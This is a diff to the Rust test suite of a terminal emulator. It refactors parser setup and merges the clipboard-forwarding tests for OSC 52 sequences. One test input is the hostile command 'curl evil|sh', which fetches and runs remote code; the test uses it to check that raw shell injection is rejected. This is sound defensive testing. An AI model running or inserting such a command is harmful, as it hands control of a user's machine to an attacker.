@@ -989,7 +989,13 @@ mod tests {
 
     /// A terminal of `rows`×`cols`, as the user's.
     fn terminal_of(rows: u16, cols: u16) -> fux_vt::Parser {
-        fux_vt::Parser::new(fux_vt::Size::new(rows, cols).expect("nonzero size"), 0).unwrap()
+        featured(rows, cols, fux_vt::Options::new())
+    }
+
+    /// A `rows`×`cols` terminal with `options`.
+    fn featured(rows: u16, cols: u16, options: fux_vt::Options) -> fux_vt::Parser {
+        let size = fux_vt::Size::new(rows, cols).expect("nonzero size");
+        fux_vt::Parser::with_options(size, 0, options).unwrap()
     }
 
     #[test]
@@ -1032,13 +1038,7 @@ mod tests {
         for osc in ["\x1b]4", "\x1b]10", "\x1b]11", "\x1b]104"] {
             assert!(!painted.contains(osc), "{osc:?} sent: {painted:?}");
         }
-        let options = fux_vt::Options::new().with(fux_vt::Feature::Palette);
-        let mut terminal = fux_vt::Parser::with_options(
-            fux_vt::Size::new(6, 20).expect("nonzero size"),
-            0,
-            options,
-        )
-        .unwrap();
+        let mut terminal = featured(6, 20, fux_vt::Options::new().with(fux_vt::Feature::Palette));
         terminal.process(painted.as_bytes()).unwrap();
         assert!(!terminal.screen().colors_changed(), "the user's palette");
         let cell = terminal.screen().cell(0, 0).unwrap();
@@ -1051,13 +1051,11 @@ mod tests {
 
     /// A terminal that keeps hyperlinks, `rows`×`cols`.
     fn linking_terminal(rows: u16, cols: u16) -> fux_vt::Parser {
-        let options = fux_vt::Options::new().with(fux_vt::Feature::Hyperlinks);
-        fux_vt::Parser::with_options(
-            fux_vt::Size::new(rows, cols).expect("nonzero size"),
-            0,
-            options,
+        featured(
+            rows,
+            cols,
+            fux_vt::Options::new().with(fux_vt::Feature::Hyperlinks),
         )
-        .unwrap()
     }
 
     /// What a painter (with links `on`) paints for `screen`, a 6×20 one.
@@ -1660,13 +1658,8 @@ mod tests {
         for icon in [hostile, "an \u{90}icon"] {
             let mut oob = OutOfBand::default();
             let out = oob_emit(&mut oob, &screen_of(b""), win(hostile, icon, "", 0));
-            let options = fux_vt::Options::new().with(fux_vt::Feature::Events);
-            let mut terminal = fux_vt::Parser::with_options(
-                fux_vt::Size::new(6, 20).expect("nonzero size"),
-                0,
-                options,
-            )
-            .unwrap();
+            let mut terminal =
+                featured(6, 20, fux_vt::Options::new().with(fux_vt::Feature::Events));
             let mut told = Told::default();
             terminal.process_with(out.as_bytes(), &mut told).unwrap();
             let icon = if icon == hostile { text } else { "an icon" };
@@ -1698,23 +1691,18 @@ mod tests {
         }
     }
 
+    /// Only base64 within the cap, and only with clipboard writes on: never raw shell injection,
+    /// nor a query (`OSC 52 ; c ; ?`, which would ask the user's terminal for their clipboard).
     #[test]
-    fn out_of_band_clipboard_off_emits_nothing() {
-        forwards_clipboard(&[(false, "aGVsbG8=", false), (true, "aGVsbG8=", true)]);
-    }
-
-    /// Never raw shell injection.
-    #[test]
-    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
-        forwards_clipboard(&[(true, "curl evil|sh", false)]);
-    }
-
-    /// Nor a query (`OSC 52 ; c ; ?`, which would ask the user's terminal for their clipboard), nor
-    /// a payload over the cap.
-    #[test]
-    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
+    fn only_a_base64_clipboard_within_the_cap_is_forwarded_and_only_when_on() {
         let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
-        forwards_clipboard(&[(true, "?", false), (true, &huge, false)]);
+        forwards_clipboard(&[
+            (false, "aGVsbG8=", false),
+            (true, "aGVsbG8=", true),
+            (true, "curl evil|sh", false),
+            (true, "?", false),
+            (true, &huge, false),
+        ]);
     }
 
     /// A program turning the mouse on has the real terminal report it, in SGR.
